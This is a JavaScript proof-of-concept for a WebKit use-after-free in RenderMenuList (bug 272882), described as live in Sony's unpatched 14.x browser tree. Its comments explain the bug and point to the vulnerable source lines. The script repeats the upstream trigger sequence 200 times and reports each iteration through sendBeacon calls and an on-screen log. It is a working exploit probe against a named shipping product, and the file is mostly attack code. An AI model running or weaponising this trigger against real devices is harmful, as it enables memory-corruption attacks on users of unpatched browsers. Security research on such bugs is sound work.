// RenderMenuList use-after-free — WebKit bug 272882, live in Sony's 14.x tree.
//
// Upstream fixed this on 2024-08-05, eleven months after the snapshot Sony ships.
//
// A plain <select> (no `multiple`, size <= 1) is rendered by RenderMenuList. When the
// `multiple` attribute is added, HTMLSelectElement calls
// invalidateStyleAndRenderersForSubtree, which marks that RenderMenuList for destruction.
// But the renderer is still on the stack: setTextFromOption()/itemStyle() call
// element->computedStyle(), and a full style resolution can re-enter rendering and free the
// very renderer that is executing. Upstream's fix swaps in computedStyleForEditability()
// (paint-safe, no full resolution) and adds null checks.
//
// Sony's code still has the vulnerable shape:
//   WebCore/rendering/RenderMenuList.cpp  setTextFromOption():  auto* style = element->computedStyle();
//                                         itemStyle():          auto& style = *element->computedStyle();
//
// Upstream's reproducer is four lines:
//     select { container: a1 / inline-size; }
//     options[1] = undefined;      // mutate the option list first
//     select.multiple = true;      // then flip the attribute
// Building it from script because the harness only injects a <script>.

(function () {
  const fire = (tag) => { try { navigator.sendBeacon('/beacon/' + tag + '?t=' + Date.now()); } catch (e) {} };
  const out = (s) => {
    try {
      let el = document.getElementById('log');
      if (!el) {
        el = document.createElement('pre');
        el.id = 'log';
        el.style.cssText = 'position:fixed;left:0;top:0;z-index:99999;background:#000;color:#0f0;font:12px monospace;margin:0;padding:6px;white-space:pre-wrap';
        (document.body || document.documentElement).appendChild(el);
      }
      el.textContent += s + '\n';
    } catch (e) {}
  };

  // container queries have to exist for the reproducer; measure rather than assume
  let containerOk = false;
  try { containerOk = CSS.supports('container-type', 'inline-size'); } catch (e) {}
  out('container-type supported: ' + containerOk);
  fire('SEL-CONTAINER-' + (containerOk ? 'yes' : 'no'));

  const style = document.createElement('style');
  style.textContent = 'select.selprobe { container: a1 / inline-size; }';
  document.head.appendChild(style);

  let n = 0;
  const TOTAL = 200;

  function once(i) {
    const sel = document.createElement('select');
    sel.className = 'selprobe';
    sel.id = 'sel' + i;

    const o1 = document.createElement('option');
    o1.textContent = 'A';
    const o2 = document.createElement('option');
    o2.textContent = 'B';
    o2.selected = true;
    sel.appendChild(o1);
    sel.appendChild(o2);
    document.body.appendChild(sel);

    // force layout so the RenderMenuList exists
    void sel.offsetHeight;

    try {
      // exactly the upstream sequence: mutate the options, then flip `multiple`
      sel.options[1] = undefined;
      sel.multiple = true;
      void sel.offsetHeight;
      sel.multiple = false;
      void sel.offsetHeight;
    } catch (e) {
      out('threw at ' + i + ': ' + e);
    }

    sel.remove();
  }

  function step() {
    for (let k = 0; k < 10 && n < TOTAL; k++, n++) {
      once(n);
      fire('SEL-ITER-' + n);
    }
    out('iterations: ' + n);
    if (n < TOTAL) setTimeout(step, 0);
    else { out('survived ' + TOTAL); fire('SEL-SURVIVED'); }
  }

  fire('SEL-BOOT');
  setTimeout(step, 0);
})();
